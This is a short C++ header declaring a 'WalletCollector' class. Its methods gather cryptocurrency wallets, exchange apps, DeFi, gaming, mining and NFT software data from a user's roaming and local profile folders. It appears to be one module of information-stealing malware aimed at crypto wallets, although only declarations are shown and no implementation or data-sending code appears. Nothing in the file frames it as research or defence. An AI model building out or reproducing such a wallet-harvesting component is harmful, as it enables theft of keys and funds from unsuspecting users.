#ifndef WALLET_COLLECTOR_H
#define WALLET_COLLECTOR_H

#include <string>

class WalletCollector {
public:
    static std::string CollectAllWallets();
    
private:
    static std::string CollectBrowserWallets(const std::string& localPath);
    static std::string CollectDesktopWallets(const std::string& roamingPath);
    static std::string CollectExchangeApps(const std::string& roamingPath);
    static std::string CollectHardwareWallets(const std::string& roamingPath);
    static std::string CollectDeFiWallets(const std::string& roamingPath);
    static std::string CollectGamingWallets(const std::string& roamingPath, const std::string& localPath);
    static std::string CollectMiningSoftware(const std::string& roamingPath);
    static std::string CollectNFTPlatforms(const std::string& roamingPath);
};

#endif
